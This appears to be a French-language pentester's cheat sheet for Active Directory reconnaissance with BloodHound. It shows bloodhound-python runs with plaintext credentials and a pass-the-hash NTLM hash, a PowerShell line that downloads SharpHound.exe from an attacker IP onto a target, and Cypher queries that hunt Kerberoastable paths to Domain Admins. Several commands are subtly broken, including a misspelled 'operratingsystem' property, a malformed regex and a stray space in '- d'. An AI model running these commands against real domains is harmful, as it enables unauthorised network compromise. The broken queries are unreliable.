# Récolte d'informations à partir de kali
Lancement de bloodhound-python
```
sudo bloodhound-python -u JOHN_DOE -p 'P455w0rd4567' -ns 192.168.200.18 - d CORP -c all --zip
```
ou 
```
bloodhound-python -c all --dns-tcp --dns-timeout 20 -dc dc01.secura.yzx -u charlotte -p 'Game2On4.!' -d secura.yzx -ns 192.168.126.97
```
ou par le hash :
```
sudo bloodhound-python -u L.Livingstone --hashes aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808 -ns 192.168.197.175 -d resourced.local -c all --zip
```

# Récolte information à partir de Windows
On doit télécharger sur la cible Sharphound ex:
```
iwr -uri http://192.168.45.223/SharpHound.exe -Outfile SharpHound.exe
```
On execute dans Powershell :
```
.\Sharphound.exe
```
La commande ressort un fichier du style :
```
20250507014130_BloodHound.zip
```

# Lancement de l'outil d'analyse Bloodhound sur kali
On ne démarre plus neo4j à part de bloodHound, il y a une option de démarrage de l'ensemble :
```
bloodhound-start
```

# Arret de Bloodhound
```
bloodhound-stop
```

# Recherche des machine avec des OS plus supporté :
```
MATCH (H:Computer) WHERE H.operratingsystem =~ '.*(2000|2003|2008|xp|vista|7|me)*.' RETURN H
```

# Recherche des utilisateurs qui pourraient être victime de Kerberoasting et qui pouraient avoir accès à un compte administrateur :
```
MATCH (u:User {hasspn:true}) MATCH (g:Group) WHERE g.name CONTAINS 'DOMAIN ADMINS' MATCH p = shortestpath( (u)-[*1..]->(g) ) return p
```
